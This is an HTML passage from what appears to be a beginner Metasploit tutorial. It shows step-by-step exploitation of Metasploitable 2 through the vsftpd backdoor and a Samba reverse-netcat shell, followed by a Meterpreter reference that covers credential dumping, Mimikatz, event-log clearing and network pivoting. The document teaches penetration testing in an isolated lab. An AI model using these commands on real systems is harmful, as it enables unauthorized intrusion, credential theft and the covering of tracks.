  <!-- SECTION 8 -->
  <section class="section" id="s8">
    <h2>8. Exploiting Metasploitable 2 — Hands-On</h2>
    <p><strong>Metasploitable 2</strong> is an intentionally vulnerable virtual machine created by Rapid7 specifically for Metasploit practice. It is a gift to beginners — a legal, safe, and richly broken system you can attack freely in your lab. Think of it as a training dummy wearing a suit of armor full of intentional holes.</p>

    <div class="callout danger">
      <div class="callout-title">🚨 Legal &amp; Ethical Warning</div>
      <p>Only run these exercises against Metasploitable 2 on your <strong>own isolated network</strong>. Never target any system you do not own or have explicit written permission to test. Unauthorized exploitation is a serious crime in most jurisdictions.</p>
    </div>

    <h3>Lab Setup</h3>
    <ul class="styled">
      <li>Download Metasploitable 2 from SourceForge (official Rapid7 release)</li>
      <li>Run it in VirtualBox or VMware — set network adapter to <strong>Host-Only</strong></li>
      <li>Run Kali Linux in the same Host-Only network</li>
      <li>Verify connectivity: <span class="mono">ping [metasploitable-ip]</span> from Kali</li>
    </ul>

    <h3>Case Study: Exploiting vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
    <p>This is one of the most famous examples in all of penetration testing history. In 2011, the source code of vsftpd (a popular FTP server) was compromised. An attacker inserted a backdoor: if you connect to FTP and type a username ending in the smiley face <strong>:)</strong>, the server opens a root shell on port 6200. Metasploitable 2 runs this poisoned version deliberately.</p>

    <div class="step-flow">
      <div class="step">
        <div class="step-num">1</div>
        <div class="step-content">
          <h4>Confirm the Service</h4>
          <div class="code-block" style="margin-top:10px">
            <pre><span class="cmd">db_nmap</span> <span class="opt">-sV</span> <span class="val">192.168.56.101</span>
<span class="out"># You should see:
# 21/tcp   open  ftp    vsftpd 2.3.4</span></pre>
          </div>
        </div>
      </div>
      <div class="step">
        <div class="step-num">2</div>
        <div class="step-content">
          <h4>Search for the Module</h4>
          <div class="code-block" style="margin-top:10px">
            <pre><span class="cmd">search</span> <span class="val">vsftpd</span>
<span class="out">Matching Modules
================
   #  Name                                  Disclosure Date  Rank       Check
   -  ----                                  ---------------  ----       -----
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No</span></pre>
          </div>
        </div>
      </div>
      <div class="step">
        <div class="step-num">3</div>
        <div class="step-content">
          <h4>Load, Configure, and Run</h4>
          <div class="code-block" style="margin-top:10px">
            <pre><span class="cmd">use</span> <span class="val">exploit/unix/ftp/vsftpd_234_backdoor</span>
<span class="cmd">set</span> <span class="opt">RHOSTS</span> <span class="val">192.168.56.101</span>
<span class="cmd">run</span>

<span class="out">[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened</span></pre>
          </div>
        </div>
      </div>
      <div class="step">
        <div class="step-num">4</div>
        <div class="step-content">
          <h4>You Have Root!</h4>
          <div class="code-block" style="margin-top:10px">
            <pre><span class="cmd">whoami</span>
<span class="out">root</span>
<span class="cmd">id</span>
<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="cmd">cat /etc/shadow</span>   <span class="cmt"># Access the password hash file</span></pre>
          </div>
        </div>
      </div>
    </div>

    <h3>Case Study 2: Samba usermap_script (CVE-2007-2447)</h3>
    <p>Another classic Metasploitable 2 vulnerability. Samba is the software that lets Linux machines share files with Windows machines. An old version had a bug in username handling that allowed remote code execution with no authentication needed.</p>
    <div class="code-block">
      <div class="code-label">MSF Console — Samba Exploit</div>
      <pre><span class="cmd">use</span> <span class="val">exploit/multi/samba/usermap_script</span>
<span class="cmd">set</span> <span class="opt">RHOSTS</span>  <span class="val">192.168.56.101</span>
<span class="cmd">set</span> <span class="opt">PAYLOAD</span> <span class="val">cmd/unix/reverse_netcat</span>
<span class="cmd">set</span> <span class="opt">LHOST</span>   <span class="val">192.168.56.1</span>     <span class="cmt"># Your Kali IP</span>
<span class="cmd">set</span> <span class="opt">LPORT</span>   <span class="val">4444</span>
<span class="cmd">run</span>

<span class="out">[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Command shell session 2 opened
whoami
root</span></pre>
    </div>

    <div class="callout success">
      <div class="callout-title">🎯 What You Just Learned</div>
      <p>These two exploits demonstrate how a software supply chain attack (vsftpd backdoor) and an input validation bug (Samba) can completely compromise a system. The fixes? Update software, patch promptly, and monitor for anomalous network connections.</p>
    </div>
  </section>

  <div class="divider"></div>

  <!-- SECTION 9 -->
  <section class="section" id="s9">
    <h2>9. Post-Exploitation &amp; Meterpreter</h2>
    <p>Getting access to a system is only the beginning. In a real engagement, the penetration tester must demonstrate the <em>impact</em> of that access — what could a real attacker do? Post-exploitation is the art of answering that question ethically and thoroughly.</p>

    <h3>What is Meterpreter?</h3>
    <p>Meterpreter (short for <em>Meta-Interpreter</em>) is Metasploit's advanced, in-memory payload. Unlike a standard shell that just gives you a command prompt, Meterpreter is a fully featured remote management environment that:</p>
    <ul class="styled">
      <li>Lives entirely in <strong>memory</strong> — no files written to disk by default, making forensic detection harder</li>
      <li>Communicates over an <strong>encrypted channel</strong> (TLS by default)</li>
      <li>Is <strong>extensible</strong> — you can load new capabilities on-the-fly with <span class="mono">load</span> command</li>
      <li>Provides a rich set of <strong>built-in commands</strong> for file management, process manipulation, network pivoting, and more</li>
    </ul>

    <h3>Meterpreter Command Reference</h3>
    <div class="code-block">
      <div class="code-label">Meterpreter Shell — Core Commands</div>
      <pre><span class="cmt">## System Information</span>
<span class="cmd">sysinfo</span>          <span class="cmt"># OS, hostname, architecture, language</span>
<span class="cmd">getuid</span>           <span class="cmt"># Current user running the payload</span>
<span class="cmd">getpid</span>           <span class="cmt"># Process ID of Meterpreter</span>
<span class="cmd">ps</span>               <span class="cmt"># List all running processes</span>
<span class="cmd">env</span>              <span class="cmt"># Environment variables</span>

<span class="cmt">## File System</span>
<span class="cmd">pwd</span>              <span class="cmt"># Print working directory</span>
<span class="cmd">ls</span>               <span class="cmt"># List directory contents</span>
<span class="cmd">cat</span> <span class="val">secret.txt</span>  <span class="cmt"># Read file contents</span>
<span class="cmd">download</span> <span class="val">/etc/passwd</span> <span class="cmt"># Download file to attacker</span>
<span class="cmd">upload</span> <span class="val">tool.exe C:\\Users\\</span>  <span class="cmt"># Upload file to target</span>
<span class="cmd">search</span> <span class="opt">-f</span> <span class="val">*.docx</span> <span class="cmt"># Search for files by pattern</span>

<span class="cmt">## Privilege Escalation</span>
<span class="cmd">getsystem</span>        <span class="cmt"># Attempt automated privilege escalation</span>
<span class="cmd">getprivs</span>         <span class="cmt"># Show current privileges</span>

<span class="cmt">## Network &amp; Pivoting</span>
<span class="cmd">ipconfig</span>         <span class="cmt"># Network interfaces</span>
<span class="cmd">arp</span>              <span class="cmt"># ARP cache (reveals other hosts)</span>
<span class="cmd">route</span>            <span class="cmt"># Routing table</span>
<span class="cmd">portfwd add -l 8080 -p 80 -r 10.0.0.5</span>  <span class="cmt"># Port forward</span>

<span class="cmt">## Credential Harvesting</span>
<span class="cmd">hashdump</span>         <span class="cmt"># Dump Windows SAM password hashes (needs SYSTEM)</span>
<span class="cmd">load kiwi</span>        <span class="cmt"># Load Mimikatz (credential dumper)</span>
<span class="cmd">creds_all</span>        <span class="cmt"># Dump all credentials via Mimikatz</span>

<span class="cmt">## Stealth &amp; Persistence</span>
<span class="cmd">migrate</span> <span class="val">1234</span>     <span class="cmt"># Move to another process PID</span>
<span class="cmd">clearev</span>          <span class="cmt"># Clear Windows event logs</span>
<span class="cmd">background</span>       <span class="cmt"># Background the session (Ctrl+Z)</span></pre>
    </div>

    <h3>Privilege Escalation — From User to Admin</h3>
    <p>Often, initial exploitation gives you a low-privilege shell — you are logged in as a normal user, not an administrator or root. Privilege escalation is the process of gaining higher-level access by exploiting local vulnerabilities, misconfigurations, or weak permissions.</p>

    <h4>Automated Suggestion</h4>
    <div class="code-block">
      <div class="code-label">MSF Console — Post-Exploitation Recon</div>
      <pre><span class="cmt"># Background your current session first</span>
<span class="cmd">background</span>

<span class="cmt"># Run local exploit suggester</span>
<span class="cmd">use</span> <span class="val">post/multi/recon/local_exploit_suggester</span>
<span class="cmd">set</span> <span class="opt">SESSION</span> <span class="val">1</span>
<span class="cmd">run</span>

<span class="out">[*] 192.168.1.10 - Collecting local exploits for x86/linux...
[*] 192.168.1.10 - 36 exploit checks are being tried...
[+] 192.168.1.10 - exploit/linux/local/udev_netlink: The target appears to be vulnerable.
[+] 192.168.1.10 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.</span></pre>
    </div>

    <h4>Manual Techniques</h4>
    <ul class="styled">
      <li><strong>Kernel exploits</strong> — Unpatched kernel vulnerabilities (e.g., Dirty COW / CVE-2016-5195) can give root</li>
      <li><strong>SUID binaries</strong> — Files with SUID bit set run as root regardless of who executes them; misconfigured SUID binaries are a common escalation path</li>
      <li><strong>Sudo misconfigurations</strong> — If a user can run specific programs as sudo, those programs may have shell escape capabilities</li>
      <li><strong>Cron jobs</strong> — Writable scripts executed by root's cron jobs can be modified to run attacker code as root</li>
      <li><strong>Password reuse</strong> — Credentials found in config files or .bash_history used for <span class="mono">su</span> or <span class="mono">sudo</span></li>
    </ul>

    <h3>Pivoting — Reaching Hidden Networks</h3>
    <p>One of the most powerful post-exploitation capabilities is <strong>pivoting</strong>. Imagine you compromise a web server that sits in a DMZ (demilitarized zone). That server might have a network interface that can reach the internal corporate network — a network you cannot directly access from the internet. Meterpreter can turn your compromised machine into a tunnel to reach those internal systems.</p>

    <div class="code-block">
      <div class="code-label">MSF Console — Network Pivoting</div>
      <pre><span class="cmt"># From Meterpreter, discover internal networks</span>
<span class="cmd">ipconfig</span>
<span class="out">Interface 2
===========
Name         : eth1
IP address   : 10.10.10.5        &lt;-- internal network!</span>

<span class="cmt"># Add a route through this session</span>
<span class="cmd">background</span>
<span class="cmd">route add 10.10.10.0/24 1</span>   <span class="cmt"># Route via session 1</span>

<span class="cmt"># Now scan the internal network through the pivot</span>
<span class="cmd">use</span> <span class="val">auxiliary/scanner/portscan/tcp</span>
<span class="cmd">set</span> <span class="opt">RHOSTS</span> <span class="val">10.10.10.0/24</span>
<span class="cmd">run</span>  <span class="cmt"># Traffic tunnels through session 1!</span></pre>
    </div>
  </section>

